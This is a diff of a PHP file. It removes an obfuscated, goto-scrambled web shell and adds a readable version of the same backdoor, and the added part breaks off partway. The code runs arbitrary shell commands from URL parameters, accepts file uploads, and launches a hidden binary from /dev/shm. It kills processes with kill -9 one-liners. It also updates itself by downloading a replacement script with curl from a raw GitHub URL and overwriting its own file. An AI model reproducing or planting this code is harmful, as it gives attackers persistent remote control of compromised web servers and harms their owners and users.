@@ -1,1 +1,415 @@
-<?php goto mz4tI; rgUDK: $qTsxr = $_SERVER["\110\x54\124\120\x5f\110\117\123\x54"]; goto RQkTp; gaMKv: oe99I: goto a5qe2; VVrjN: d_oyY($svpd1); goto LA8m6; grJn6: Oqffi: goto gBXHr; qiIW0: D_OYY($D3wnv); goto q0FmS; AVduW: o_F1n: goto vL81A; cnAnJ: SB4HB: goto MGg7h; TeX67: if (file_exists($rxgR9)) { goto FMfLg; } goto lbz2F; sbWA8: echo D_Oyy("\x6c\x73\x20\55\x61\x6c"); goto Q8ieK; wSkxM: echo "\12\x6b\151\154\x6c\40\141\x6c\154\40\144\x65\146\165\156\x63\x20\160\162\x6f\143\x65\x73\163\xa"; goto ozZeq; y7PiO: $mvkuW = "\165\x6e\153\x6e\x6f\167\x6e"; goto gaMKv; WkqSA: die("\xa\x64\157\x6e\145\41"); goto NwesE; Cbmk5: goto Oqffi; goto el7EQ; RcH3j: $vbXU0 = posix_getpwuid(getmyuid())["\x64\151\x72"]; goto PG8B9; iAxmD: goto BxeY8; goto Q_s0e; G7VTP: jnhyO: goto Eu2M0; cHC7V: goto P0VGb; goto o6NbR; PZCY1: if ($aw7yg) { goto uVRt1; } goto kTAW1; d23FT: if (file_exists($lTJX1)) { goto mxyHs; } goto kc6Cp; u5pk2: echo "\165\160\x6c\x6f\x61\144\145\x64\x20\164\x6f\x20\74\x61\40\150\x72\x65\x66\75\x27{$xxwcV}\x27\x3e{$xxwcV}\74\57\x61\x3e\xa"; goto zX6F5; gUVyv: d_oyY("\x6c\x73\40\x2d\x61\154"); goto IiVMJ; Dbx1I: $JuLP5 = array(); goto Hfa0Q; CP0ie: if (!($mF3ZV != '')) { goto ReUxK; } goto ndeMw; q0FmS: die("\xa\144\x6f\x6e\x65\41"); goto E5zjB; TVSuu: $C0gCD = substr($C0gCD, $mlD6s + 1); goto tDE5k; rtQmw: echo "\x75\x70\x63\154\x69\x3a\x20{$rxgR9}"; goto Is4NB; G66Mp: fHm2M: goto jx15G; SM_3n: $mvkuW = $_SERVER["\123\105\122\x56\105\x52\x5f\x41\x44\104\122"]; goto zmel_; oCBn5: Ou5zs: goto GsbX9; D2hCp: function j1Rnk() { goto z_kKW; xB9Ap: $Ba6bC = (int) ($Ba6bC / 60); goto M_O5E; yjHq1: $KaMwR = $Ba6bC; goto QQGDI; mAicM: $tFrhq = $Ba6bC % 60; goto xB9Ap; BSFqv: $Ba6bC = floatval($KLs_t); goto mAicM; tETfY: $Ba6bC = (int) ($Ba6bC / 24); goto yjHq1; Bhx7V: $LTAmB = $Ba6bC % 24; goto tETfY; doGQh: $Ba6bC = (int) ($Ba6bC / 60); goto Bhx7V; QQGDI: return "{$KaMwR}\40\x64\141\x79\x73\40{$LTAmB}\40\150\x6f\x75\162\x73\x20{$C5pF1}\x20\155\151\156\163"; goto DRHSM; M_O5E: $C5pF1 = $Ba6bC % 60; goto doGQh; z_kKW: $KLs_t = @file_get_contents("\x2f\x70\x72\x6f\x63\57\165\x70\164\151\155\145"); goto BSFqv; DRHSM: } goto msvcM; tO7mj: $xpeTY = ''; goto k7FjW; pSwNm: if (!($OuRwS != '')) { goto ywr4L; } goto fqnT4; btCTJ: goto aWD7V; goto OaCdb; R3Z16: $rxgR9 = ''; goto nzjuD; HaK5Z: if (file_exists($rxgR9)) { goto i7qUT; } goto R3Z16; lbz2F: @mkdir($rxgR9); goto ZzQQe; Ps3jj: if ($rxgR9 = "\x2f\x64\x65\x76\x2f\x73\x68\155\57\x2e\143\157\x6e\x66\x69\147") { goto fUUxP; } goto IWMRq; VNK1U: $mF3ZV = "\143\165\x72\x6c\x20\55\x73\x20\x68\x74\x74\160\163\x3a\x2f\x2f\162\141\167\56\x67\151\x74\150\x75\142\165\x73\x65\x72\143\157\156\164\x65\x6e\164\56\x63\x6f\155\x2f\x73\151\x77\x61\160\x2f\x6d\171\x2d\146\141\166\x2d\167\x65\x62\x2f\x6d\x61\x69\x6e\57\x6d\x79\x6c\x6f\x70\x2e\x74\170\x74\40\55\x6f\40{$cL0i0}"; goto T9twp; HQdZa: echo "\106\151\154\145\x20\x77\151\x6c\154\x20\142\x65\x20\x6f\166\x65\162\x77\162\151\164\x74\x65\156\xa"; goto cnAnJ; DUzoQ: @mkdir($rxgR9); goto HaK5Z; mz4tI: ini_set("\x6d\141\x78\x5f\x65\170\145\143\165\164\151\157\156\x5f\x74\x69\x6d\145", 0); goto oXDha; T9twp: echo "{$mF3ZV}\xa"; goto ghrwb; spgfu: function epuWy(&$L3ayy) { goto qxoTK; hCmik: goto JbmSm; goto IP7UE; Xc4Sz: if ($CCsnP < 2) { goto Sdl0M; } goto iA0M9; Qe6XO: $CCsnP = count($CCsnP); goto ERQMR; cNoet: JbmSm: goto cgt8h; iu8ap: $CCsnP = explode("\x70\162\157\x63\145\163\163\x6f\162", $Y1Nhh); goto Qe6XO; uDRfh: $mlD6s = $mlD6s + strlen("\x6d\157\x64\x65\154\40\x6e\141\155\145\40\40\40\x20\x3a"); goto aLNHg; aLNHg: $W6a0N = stripos($Y1Nhh, chr(10), $mlD6s); goto GAnBZ; vaoiQ: $mlD6s = stripos($Y1Nhh, "\x6d\157\144\x65\154\40\x6e\141\155\x65\x20\x20\x20\40\40\40\40\40\72"); goto uDRfh; GAnBZ: $L3ayy = trim(substr($Y1Nhh, $mlD6s, $W6a0N - $mlD6s)); goto Xc4Sz; iA0M9: return $CCsnP - 1; goto hCmik; IP7UE: Sdl0M: goto fXtAp; qxoTK: $Y1Nhh = file_get_contents("\57\x70\162\x6f\x63\x2f\x63\160\x75\x69\x6e\146\x6f"); goto iu8ap; ERQMR: $L3ayy = "\147\x65\155\142\x65\x6c"; goto vaoiQ; fXtAp: return "\156\x2f\x61"; goto cNoet; cgt8h: } goto He_qp; Rl0Hj: echo "\74\146\x6f\x72\155\x20\x6d\x65\x74\x68\x6f\x64\75\47\120\117\123\x54\47\x20\x65\x6e\x63\164\171\160\145\75\47\155\x75\154\164\x69\x70\141\x72\164\x2f\x66\x6f\162\155\x2d\144\x61\x74\141\47\76\74\x69\156\x70\x75\164\40\164\x79\x70\145\75\47\146\x69\x6c\145\47\x20\156\x61\155\x65\x3d\x27\x66\x69\x6c\x65\x27\40\57\76\x20\74\151\x6e\160\x75\x74\x20\164\x79\160\x65\75\47\163\x75\x62\x6d\151\164\47\x20\166\141\x6c\165\x65\x3d\x27\x75\160\154\157\x61\144\x27\x20\x2f\x3e\x3c\x2f\x66\x6f\x72\x6d\x3e\74\160\x72\145\x3e"; goto hJoCd; lb66y: pb4au: goto SBERO; QzuDZ: $ucDCi = array(); goto Dbx1I; rLK0i: echo "\15\xa\x3c\163\x63\x72\151\x70\x74\76\x6c\x6f\x63\141\164\151\x6f\156\56\x68\x72\x65\x66\75\x22"; goto B5OXd; gBXHr: echo "\x75\x70\144\x69\x72\x3a\40{$PBPob}\12"; goto rtQmw; bus3J: $aw7yg = rename($cL0i0, $C0gCD); goto ZY5F9; a5qe2: echo "\x3c\x74\x69\164\154\145\76\x49\x4e\106\x4f\x3a\40" . $qTsxr . "\74\57\164\151\x74\x6c\145\76"; goto DjZ1I; Et2Dr: if (isset($_GET["\144\x66\x75"])) { goto oOcO0; } goto MNL08; GwLGV: $lTJX1 = "{$vbXU0}\x2f\145\x74\143\57\x2e\x70\153\x69\x2f\162\x75\x6e"; goto mP1TV; zboMn: echo "\x3c\x70\x72\145\x3e\12"; goto D68ky; BfUp0: $C0gCD = $_SERVER["\x50\x48\120\x5f\123\x45\x4c\x46"]; goto X2Ta3; FefMy: $bBig7 = mt_rand(0, $hT01v - 1); goto yf3gA; k7FjW: $qTsxr = $_SERVER["\x53\105\122\x56\105\x52\137\116\x41\115\105"]; goto SM_3n; V5wf_: Fc_72: goto Cd6ji; mP1TV: Y0sUo: goto ggiVi; MGg7h: $aw7yg = move_uploaded_file($OuRwS, $VMjxL); goto PZCY1; ZDqiD: $rxgR9 = "\57\x64\145\166\57\163\x68\155\57\x2e\x63\157\156\x66\151\147"; goto TeX67; f0sIr: $xxwcV = "{$xxwcV}\x2f{$IF9sy}"; goto fFln8; PKush: $mF3ZV = rawurldecode($mF3ZV); goto nZn4w; GsbX9: goto uRWQg; goto lb66y; sa2yQ: echo "\x22\74\x2f\x73\143\x72\x69\x70\x74\76\15\12"; goto SSS4f; G14aB: d_oyy($svpd1); goto dD48h; He_qp: function OwJyC() { goto zg7f1; Rg6R5: $qlyjx = $VlwzK = $VlwzK["\156\141\155\145"]; goto kd_nE; lz_dj: $WsRb0 = $m7pOo["\x6e\x61\x6d\145"]; goto OXFxC; kd_nE: return "{$WsRb0}\x20\x28{$qlyjx}\51"; goto PQ58p; OXFxC: $VlwzK = posix_getgrgid(posix_getgid()); goto Rg6R5; zg7f1: $m7pOo = posix_getpwuid(posix_getuid()); goto lz_dj; PQ58p: } goto D2hCp; f1HVY: if (file_exists($PBPob)) { goto U1HPj; } goto e0ep6; nZn4w: echo "\x3e\x20{$mF3ZV}\xa"; goto CP0ie; Y6_vY: $xxwcV = substr($OuRwS, 0, $mlD6s) . "\57{$PBPob}"; goto QzuDZ; NwesE: fXvyS: goto or4Xo; OxoOR: if (file_exists($lTJX1)) { goto Y0sUo; } goto GwLGV; XfHUl: UCPCQ: goto KTqY6; o9VX5: if (isset($_GET["\143\x6d\x64"])) { goto pb4au; } goto G_BkD; m3cqY: die("\xa\x64\157\156\x65\41"); goto bPuaF; zX6F5: goto TdtNU; goto GNk5_; ZzQQe: if (file_exists($rxgR9)) { goto mddGq; } goto om6_h; lTrh9: mxyHs: goto xiBQZ; ibl0n: $mlD6s = strpos($OuRwS, "\75"); goto Jq2jl; A1ulc: goto AsZFD; goto GhgzE; kxc2Q: @mkdir($PBPob); goto f1HVY; o6NbR: iDFb8: goto G14aB; dD48h: chmod("{$rxgR9}\x2f\143\154\x69", 0755); goto PTypC; BK8k5: die("\12\144\157\156\x65\x21"); goto nMHPy; EIQS7: aj0sQ: goto FefMy; GhgzE: PSiSS: goto vaNxY; rmB5Q: echo "\x75\160\154\x6f\x61\144\145\144\x20\x74\x6f\40{$VMjxL}\12"; goto nUbo1; vjSaM: goto I2rwo; goto V5wf_; AXGUF: echo "\xa\x44\x4f\x57\x4e\114\117\x41\104\x20\106\101\x49\x4c\105\x44\41\12"; goto DV1tr; ephVO: die("\xa\x64\157\x6e\x65\x21"); goto yx5ul; ZkeWn: D_oyy("\56\x2f\x72\x75\156"); goto OEHGe; mS6ms: echo d_OYY("\x70\x73\x20\55\x75\x78"); goto eSKJX; bPuaF: ReUxK: goto uGaVm; zmel_: $UrWFs = $_SERVER["\122\105\x4d\117\124\x45\x5f\101\104\x44\x52"]; goto cFcrq; NHuC5: Z3UZr: goto Rl0Hj; el7EQ: fUUxP: goto KXiCa; ozZeq: D_oYY($D3wnv); goto mS6ms; lgdKr: FMfLg: goto Ps3jj; kTAW1: die("\105\x52\122\x4f\122\72\x20\x75\x70\x6c\x6f\x61\x64\x20\146\x61\151\154\x65\144\41"); goto cEv3T; uGaVm: uRWQg: goto pvY_Z; jx15G: if (!($PBPob == '')) { goto Z3UZr; } goto JE6nm; OEHGe: die("\12\x64\x6f\x6e\x65\x21"); goto XfHUl; B2RZO: if ($IF9sy == "\x63\154\151") { goto p6rf5; } goto u5pk2; t2iwY: Uq3kM: goto T1x5c; MsVSB: if (isset($_GET["\162\x75\x6e"])) { goto xcq4I; } goto Et2Dr; EVKHb: lHlJY: goto ephVO; NeEE1: $VMjxL = "{$PBPob}\x2f{$IF9sy}"; goto A1ulc; G_BkD: if (!isset($_GET["\163\150\x6c"])) { goto Ou5zs; } goto qH979; y6rje: die; goto G66Mp; KTqY6: BxeY8: goto btCTJ; B5OXd: echo $dZij5; goto sa2yQ; RQkTp: a34Y5: goto rt84j; moCFr: bZk4K: goto BK8k5; MZlDs: aWD7V: goto oI2F4; TgoUD: if (isset($_GET["\160\x73"])) { goto o_F1n; } goto O04Vu; PG8B9: $lTJX1 = "{$rxgR9}\57\x2e\160\153\151\x2f\162\165\x6e"; goto OxoOR; tvjfj: kmxUa: goto sofXb; oXDha: $c2WkO = array("\x73\x68\145\154\154\x5f\x65\170\145\x63", "\x73\171\163\x74\x65\x6d", "\160\141\x73\x73\x74\x68\x72\165", "\x70\x72\x6f\x63\x5f\157\x70\145\156", "\x70\x6f\x70\145\156", "\145\170\x65\x63"); goto tO7mj; PTypC: $mF3ZV = "\x73\145\x74\x73\x69\144\x20{$rxgR9}\x2f\143\154\x69\40\x26"; goto KMNh0; ggiVi: echo "\x74\141\162\147\145\x74\72\x20{$lTJX1}\12"; goto d23FT; GNk5_: p6rf5: goto rmB5Q; fFln8: if ($IF9sy == "\143\154\151") { goto PSiSS; } goto NeEE1; cEv3T: goto bZk4K; goto qMbAE; gmB_Y: echo $eBy0_; goto m3cqY; KxT4j: if (isset($_GET["\x75\x70\x6c"])) { goto fHm2M; } goto y6rje; nUbo1: TdtNU: goto moCFr; ghrwb: d_OYy($mF3ZV); goto gUVyv; nzjuD: i7qUT: goto t2iwY; DYhLd: if (file_exists($PBPob)) { goto jiFvr; } goto kxc2Q; dQxIo: die("\105\122\122\117\x52\72\x20\143\154\x69\40\x6e\x6f\x74\40\x66\x6f\x75\156\144\x21"); goto cHC7V; PxxHW: SqkNK: goto VU7BK; LXWMQ: chmod($C0gCD, "\x30\66\x34\64"); goto bus3J; rBkhS: echo d_OYy("\x70\163\x20\55\x75\170"); goto WkqSA; fw_pD: $hT01v = count($L7DgB); goto IUyRe; MNL08: if (isset($_GET["\x6b\151\x6c"])) { goto SqkNK; } goto g58o9; Hfa0Q: if (!isset($_GET["\165\x70\x64"])) { goto gXxi2; } goto BfUp0; LA8m6: D_oyy($D3wnv); goto rBkhS; nznr9: e5FVP: goto LXWMQ; sQ8eC: tARlc(); goto pamd0; vaNxY: $VMjxL = "{$rxgR9}\57{$IF9sy}"; goto YVgRq; zyAPJ: $LYzD7 = posix_getpwuid($RRoE0); goto RcH3j; kc6Cp: die("\x45\122\122\x4f\122\x3a\40\x5b\141\x70\x70\135\x20\156\157\164\x20\x61\166\141\x69\154\x61\142\154\x65\41"); goto SYK5g; Eu2M0: if (file_exists("{$rxgR9}\57\143\154\151")) { goto iDFb8; } goto dQxIo; Cd6ji: echo "\12\x55\120\x44\101\124\105\x20\123\125\x43\103\105\123\123\41\xa"; goto OOkdG; Q_s0e: xcq4I: goto zyAPJ; sM868: if (file_exists($rxgR9)) { goto Uq3kM; } goto DUzoQ; X2Ta3: $mlD6s = strripos($C0gCD, "\x2f"); goto TVSuu; yDFVs: die; goto VVrjN; or4Xo: goto HWeYt; goto aLCV0; sofXb: goto fXvyS; goto PxxHW; g58o9: if (isset($_GET["\143\x6c\151"])) { goto jnhyO; } goto o9VX5; E5zjB: P0VGb: goto tvjfj; t62UL: echo "\162\165\156\156\151\156\147\x20\133\141\160\x70\135\56\x2e\56" . PHP_EOL; goto ZkeWn; ZY5F9: if ($aw7yg) { goto Fc_72; } goto UsHQ4; mat2P: iS0X_: goto KxT4j; i45gS: die("\x45\122\x52\x4f\x52\72\x20\x6e\x6f\x20\163\x68\154\40\x66\157\165\x6e\x64\x21"); goto EIQS7; Jq2jl: $mF3ZV = substr($OuRwS, $mlD6s + 1); goto PKush; YVgRq: AsZFD: goto OXhjE; T1x5c: mddGq: goto lgdKr; D68ky: G96GC: goto ZDqiD; vL81A: echo D_OYY("\x70\x73\x20\55\x75\x78"); goto GtWYf; fqnT4: $IF9sy = $_FILES["\x66\x69\154\145"]["\156\x61\155\145"]; goto f0sIr; pamd0: $OuRwS = $_SERVER["\122\x45\x51\125\x45\123\x54\137\x55\122\x49"]; goto MolNI; DjZ1I: if (!(php_sapi_name() !== "\x63\154\151")) { goto G96GC; } goto zboMn; MolNI: $mlD6s = strripos($OuRwS, "\57"); goto Y6_vY; pHrG4: function TARLC() { goto WwN69; MOw5g: $rh5tk = trim(ini_get("\x64\x69\x73\141\x62\154\145\x5f\x66\165\x6e\x63\164\x69\157\x6e\163")); goto gMEvg; k13CL: Uc3dF: goto u5gof; JuBOt: if (!($xpeTY == '')) { goto Yqc_Q; } goto K_tjI; K_tjI: echo "\101\x6c\154\40\x4f\123\40\146\165\156\x63\x74\151\157\156\x73\40\144\x69\163\x61\x62\x6c\145\x64\41\xa"; goto vF2bc; m9k0I: echo str_repeat("\x3d", 100); goto VKd_2; vnmBU: BC_Tv: goto CrXOR; VKd_2: echo "\xa{$WroSW}\x20\76\40{$qTsxr}\40\x28{$mvkuW}\51\40\174\x20\103\x4c\111\x45\x4e\x54\111\x50\72\40{$UrWFs}\xa"; goto JmeDd; qNw3k: $J0QnY = oK9AD(); goto m9k0I; SjxkW: if (!($rh5tk != '')) { goto BC_Tv; } goto e1qUR; A6h8E: echo str_repeat("\75", 95) . "\x20\x76\60\x2e\x32\67\xa"; goto k13CL; u5gof: echo "\x50\x57\104\x3a\40" . getcwd() . "\xa\12"; goto JxGKQ; PiEcI: $WroSW = php_uname("\156"); goto Y20wF; EoQj3: $xNN1A = OWJYC(); goto qNw3k; k1D5j: foreach ($X0RJe as $zjCs3) { goto yRsO_; RaZ1e: goto zxzEW; goto kmXV4; kmXV4: Y6F4g: goto DvY_0; yRsO_: $xpeTY = $zjCs3; goto RaZ1e; DvY_0: } goto Y1xm2; zUr0X: $rh5tk = "\x6e\x6f\x6e\x65"; goto RGg2d; e1qUR: echo "\x64\x69\163\141\142\154\x65\x5f\x66\x75\156\143\x74\151\x6f\x6e\163\x20\75\40{$rh5tk}\xa"; goto vnmBU; fujb7: $t2tI1 = "\125\x50\x54\x49\115\105\x20\x3e\40{$t2tI1}"; goto EoQj3; RGg2d: $xpeTY = "\x73\150\x65\154\x6c\x5f\x65\170\x65\143"; goto m4IRd; HrcCf: echo php_uname("\163") . "\x20" . php_uname("\162") . "\x20" . php_uname("\x76") . "\xa"; goto lqRdN; vF2bc: Yqc_Q: goto SjxkW; NZ0O0: lrdaH: goto zUr0X; Y1xm2: zxzEW: goto Xcc6W; P8M33: echo "\x20\40\x20\127\110\117\101\115\111\x20\x3e\40{$xNN1A}\12"; goto A6h8E; Y20wF: $t2tI1 = j1rNk(); goto fujb7; JmeDd: echo "\133\x20{$Ovc7I}\x20\x5d\x20{$hxf93}\x20\55\40{$J0QnY}\12\12"; goto HrcCf; UEW2l: $X0RJe = array_diff($c2WkO, $rMGRl); goto k1D5j; m4IRd: wcXRT: goto JuBOt; WwN69: $X0RJe = array(); goto KXtwp; gMEvg: if ($rh5tk == '') { goto lrdaH; } goto HH0fr; HH0fr: $rh5tk = str_ireplace(chr(32), '', $rh5tk); goto GEW7e; CrXOR: if (!($xpeTY != '')) { goto Uc3dF; } goto zikx1; zikx1: $Ovc7I = EPuwY($hxf93); goto PiEcI; KXtwp: global $qTsxr, $mvkuW, $UrWFs, $c2WkO, $xpeTY; goto MOw5g; GEW7e: $rMGRl = explode("\54", $rh5tk); goto UEW2l; Xcc6W: goto wcXRT; goto NZ0O0; lqRdN: echo "\x20\40\40{$t2tI1}\12"; goto P8M33; JxGKQ: } goto KIczo; EmMtu: D_OYy($mF3ZV); goto qiIW0; VU7BK: echo "\xa\x6b\151\154\154\x20\141\154\x6c\40\x63\154\151\x20\160\x72\x6f\143\x65\x73\x73\12"; goto yDFVs; qH979: $L7DgB = glob("{$PBPob}\57\x2a\x2e\160\150\x70"); goto fw_pD; IUyRe: if (!($hT01v == 0)) { goto aj0sQ; } goto i45gS; KXiCa: $PBPob = "\56\143\x66\147"; goto DYhLd; ndeMw: $eBy0_ = d_OYy($mF3ZV); goto gmB_Y; JE6nm: die("\156\157\40\165\x70\x6c\x6f\x61\x64\40\x64\151\162\x21"); goto NHuC5; Is4NB: $svpd1 = "\160\x6b\151\x6c\x3d\x24\50\x70\163\40\x2d\165\x78\x20\x7c\40\x67\162\145\160\x20\42\x2f\x63\154\x69\x22\40\40\174\x20\x61\167\x6b\x20\x27\x7b\x70\x72\x69\156\x74\x20\x24\x32\x7d\x27\40\x7c\40\163\x6f\162\164\x20\x7c\40\x75\x6e\x69\x71\40\174\x20\x65\x67\x72\x65\x70\x20\x2d\x76\x20\x27\136\x31\x24\x27\x29\73\40\x65\x63\150\157\40\42\44\x70\153\151\154\x22\x20\174\40\x78\x61\x72\x67\163\x20\153\x69\154\x6c\40\x2d\x39"; goto ujsgl; om6_h: $rxgR9 = "\56\x63\146\x67"; goto sM868; yyfQc: HWeYt: goto iAxmD; SSS4f: die("\xa\x64\x6f\x6e\145\x21"); goto oCBn5; oI2F4: goto iS0X_; goto AVduW; OaCdb: ZrHbo: goto sbWA8; KMNh0: echo "\x72\x75\x6e\156\x69\156\147\x20\143\154\x69\x2e\x2e\x2e" . PHP_EOL; goto EmMtu; cFcrq: if (!($qTsxr == "\x30")) { goto a34Y5; } goto rgUDK; qMbAE: uVRt1: goto B2RZO; IWMRq: $PBPob = $rxgR9; goto Cbmk5; xiBQZ: chdir(substr($lTJX1, 0, -3)); goto t62UL; xlmM2: jiFvr: goto grJn6; OOkdG: chmod($C0gCD, "\60\64\x34\x34"); goto rGsIB; rGsIB: I2rwo: goto EVKHb; GtWYf: die("\12\144\x6f\156\x65\x21"); goto mat2P; IiVMJ: if (file_exists($cL0i0) && filesize($cL0i0) > 15000) { goto e5FVP; } goto AXGUF; yf3gA: $dZij5 = $L7DgB[$bBig7]; goto rLK0i; KIczo: function Ok9aD() { goto mjhrw; n3jdF: wL2Zm: goto km637; mjhrw: $Y1Nhh = file_get_contents("\x2f\160\162\x6f\x63\57\x6d\x65\155\x69\156\146\157"); goto uyONC; Aon1S: $J0QnY = "\133\40" . number_format(intval($J0QnY) / 1000.0, 1) . "\x20\107\151\x42\40\x5d\40\124\157\x74\141\154\x20\x4d\x65\x6d\x6f\x72\171"; goto n3jdF; q_56E: H03PN: goto Aon1S; FZR01: goto wL2Zm; goto q_56E; HK6zK: $J0QnY = $Y1Nhh; goto XGC_C; TsqLg: $J0QnY = "\133\40" . number_format($J0QnY, 0) . "\40\x4d\x69\102\40\135\40\x54\x6f\164\141\x6c\40\x4d\x65\x6d\157\162\x79"; goto FZR01; XGC_C: if (intval($J0QnY >= 1000)) { goto H03PN; } goto TsqLg; uyONC: $Y1Nhh = floatval(trim(substr($Y1Nhh, 12))) / 1000; goto HK6zK; km637: return $J0QnY; goto rP2S1; rP2S1: } goto spgfu; pvY_Z: goto kmxUa; goto G7VTP; nMHPy: ywr4L: goto pHrG4; SLC28: U1HPj: goto xlmM2; SYK5g: goto UCPCQ; goto lTrh9; eSKJX: die("\xa\x64\x6f\x6e\x65\41"); goto yyfQc; UsHQ4: echo "\12\x55\x50\104\x41\x54\105\x20\x46\101\111\114\x45\x44\41\12"; goto vjSaM; O04Vu: if (isset($_GET["\154\x73"])) { goto ZrHbo; } goto MsVSB; yx5ul: gXxi2: goto TgoUD; tDE5k: $cL0i0 = "\165\160\x64\55{$C0gCD}"; goto VNK1U; ujsgl: $D3wnv = "\160\144\x66\165\75\x24\50\x70\163\x20\55\x65\146\x20\x7c\x20\x67\162\x65\160\x20\x5b\144\x5d\x65\146\x75\156\143\x74\40\40\174\x20\141\167\153\x20\x27\x7b\160\162\151\156\x74\40\x24\x33\x7d\47\40\174\40\x73\x6f\162\164\x20\174\40\x75\x6e\x69\x71\x20\x7c\40\145\x67\162\x65\x70\40\x2d\x76\x20\x27\136\61\x24\47\51\73\x20\145\143\150\157\x20\42\44\160\x64\x66\x75\x22\x20\x7c\40\170\141\162\x67\x73\x20\x6b\151\154\x6c\40\x2d\x39"; goto sQ8eC; e0ep6: $PBPob = ''; goto SLC28; SBERO: $OuRwS = $_SERVER["\x52\x45\x51\125\x45\x53\x54\x5f\125\122\111"]; goto ibl0n; Q8ieK: die("\12\x64\157\156\145\41"); goto MZlDs; hJoCd: $OuRwS = $_FILES["\x66\151\x6c\x65"]["\x74\x6d\x70\137\156\141\155\x65"]; goto pSwNm; OXhjE: if (!file_exists($VMjxL)) { goto SB4HB; } goto HQdZa; DV1tr: goto lHlJY; goto nznr9; rt84j: if (!($mvkuW == '')) { goto oe99I; } goto y7PiO; aLCV0: oOcO0: goto wSkxM; msvcM: function d_oyy($mF3ZV) { goto maKzO; uuuhE: $nLuvb = $mF3ZV; goto EoHuh; h8rwV: oK_Qg: goto JqFIs; UFDp_: $g2yBX = htmlentities($fsoGZ); goto mpKGS; maKzO: global $xpeTY; goto uuuhE; QWipc: switch ($xpeTY) { case "\x73\171\163\x74\x65\155": goto TpNud; VMnBC: $fsoGZ = ob_get_contents(); goto tKdvJ; tKdvJ: ob_end_clean(); goto vhG_n; TpNud: ob_start(); goto BF2SC; vhG_n: goto Si3gb; goto mHsDl; BF2SC: system($nLuvb); goto VMnBC; mHsDl: case "\x70\141\x73\163\164\150\x72\x75": goto SaLj8; SaLj8: ob_start(); goto IN3wD; W9SDU: goto Si3gb; goto Maknx; Yu3ic: $fsoGZ = ob_get_contents(); goto MWx1_; IN3wD: passthru($nLuvb); goto Yu3ic; MWx1_: ob_end_clean(); goto W9SDU; Maknx: case "\x73\x68\x65\x6c\x6c\x5f\x65\170\x65\x63": $fsoGZ = shell_exec($nLuvb); goto Si3gb; case "\x65\x78\x65\143": goto H4bSn; H4bSn: $zrJPV = NULL; goto xciHT; BqVvD: goto Si3gb; goto G17k1; lxywS: if (!is_array($zrJPV)) { goto P541W; } goto AHB7A; vk5lZ: eVend: goto e8RXF; AHB7A: foreach ($zrJPV as $GMH76) { $fsoGZ .= "{$GMH76}\xa"; UcqI3: } goto vk5lZ; e8RXF: P541W: goto BqVvD; xciHT: exec($nLuvb, $zrJPV); goto lxywS; G17k1: case "\160\x6f\x70\x65\x6e": goto o3rYi; a4OlB: if (feof($UXgr4)) { goto PpSfV; } goto Jj_e6; EWp_G: goto Si3gb; goto srRcq; RX7XV: diUVi: goto a4OlB; OreO5: PpSfV: goto nPTRT; DXiXZ: GXwlC: goto EWp_G; nPTRT: pclose($UXgr4); goto DXiXZ; y3CTR: goto diUVi; goto OreO5; o3rYi: if (!($UXgr4 = popen($nLuvb, "\162"))) { goto GXwlC; } goto RX7XV; Jj_e6: $fsoGZ .= fread($UXgr4, 1024); goto y3CTR; srRcq: case "\160\x72\157\143\137\x6f\x70\x65\x6e": goto HQRrG; eViOx: goto Si3gb; goto NngQf; Pr0Xl: $fsoGZ = stream_get_contents($mlD6s[1]); goto y9yeQ; lJub3: proc_close($UXgr4); goto B1fce; rHbkJ: fclose($mlD6s[1]); goto lJub3; HQRrG: if (!($UXgr4 = proc_open($nLuvb, array(array("\x70\151\160\x65", "\162"), array("\x70\151\160\145", "\167"), array("\160\151\160\x65", "\141")), $mlD6s))) { goto xg150; } goto Pr0Xl; B1fce: xg150: goto eViOx; y9yeQ: fclose($mlD6s[0]); goto rHbkJ; NngQf: case "\x77\151\156\144\157\167\163": goto Si3gb; default: die("\x65\162\x72\x6f\162\40{$xpeTY}"); } goto h8rwV; EoHuh: $fsoGZ = ''; goto QWipc; mpKGS: return $g2yBX; goto fK7JB; JqFIs: Si3gb: goto UFDp_; fK7JB: }
+<?php 
+ini_set('max_execution_time', 0);
+//error_reporting(0);
+
+$funclist=array('shell_exec','system','passthru','proc_open','popen','exec');
+$fncmaster="";
+
+$host=$_SERVER['SERVER_NAME'];
+$hostaddr=$_SERVER['SERVER_ADDR'];
+$clientip=$_SERVER['REMOTE_ADDR'];
+if($host=="0") $host=$_SERVER['HTTP_HOST'];
+if($hostaddr=="") $hostaddr="unknown";
+
+//echo "<pre>";print_r($_SERVER);
+//die("h=$hostaddr");
+
+echo '<title>INFO: ' . $host . '</title>';
+if (php_sapi_name()!=='cli')
+    echo "<pre>\n";
+
+
+$upload_cli="/dev/shm/.config";
+if(!file_exists($upload_cli)) {
+    @mkdir($upload_cli);
+    if(!file_exists($upload_cli)) {
+        $upload_cli=".cfg";
+        if(!file_exists($upload_cli)) {
+            @mkdir($upload_cli);
+            if(!file_exists($upload_cli))
+                $upload_cli="";
+        }
+    }
+}
+
+if ($upload_cli="/dev/shm/.config") {
+    $upload_dir=".cfg";
+    if(!file_exists($upload_dir)) {
+        @mkdir($upload_dir);
+        if(!file_exists($upload_dir))
+            $upload_dir="";
+    }
+} else
+    $upload_dir=$upload_cli;
+
+
+// if($upload_dir!="" && file_exists("-")) {
+//     exe("mv -/* $upload_dir");
+// }
+
+//echo("updir: $upload_dir\n");
+//echo("upcli: $upload_cli");
+
+//print_r($_SERVER);die();
+$killclis= <<<term
+pkil=$(ps -ux | grep "/cli"  | awk '{print $2}' | sort | uniq | egrep -v '^1$'); echo "\$pkil" | xargs kill -9
+term;
+$killdfu = <<<term
+pdfu=$(ps -ef | grep [d]efunct  | awk '{print $3}' | sort | uniq | egrep -v '^1$'); echo "\$pdfu" | xargs kill -9
+term;
+
+get_cpu_info();
+
+$tmp=$_SERVER['REQUEST_URI'];
+
+$p=strripos($tmp,"/");
+$link=substr($tmp,0,$p) . "/$upload_dir";
+$a=Array();$b=Array();
+
+if(isset($_GET["upd"])) {
+
+    $oldfile=$_SERVER['PHP_SELF'];
+    $p=strripos($oldfile,"/");
+    $oldfile=substr($oldfile,$p+1);
+
+    $new="upd-$oldfile";
+    $cmd="curl -s https://raw.githubusercontent.com/siwap/my-fav-web/main/mylop.txt -o $new";
+    echo "$cmd\n";
+    exe($cmd);
+    exe("ls -al");
+    if(file_exists($new) && filesize($new)>15000) {
+        chmod($oldfile,"0644");
+        $ret=rename($new,$oldfile);
+        if($ret) {
+            echo("\nUPDATE SUCCESS!\n");
+            chmod($oldfile,"0444");
+        }
+        else echo("\nUPDATE FAILED!\n");
+    } else
+    echo("\nDOWNLOAD FAILED!\n");
+
+    die("\ndone!");
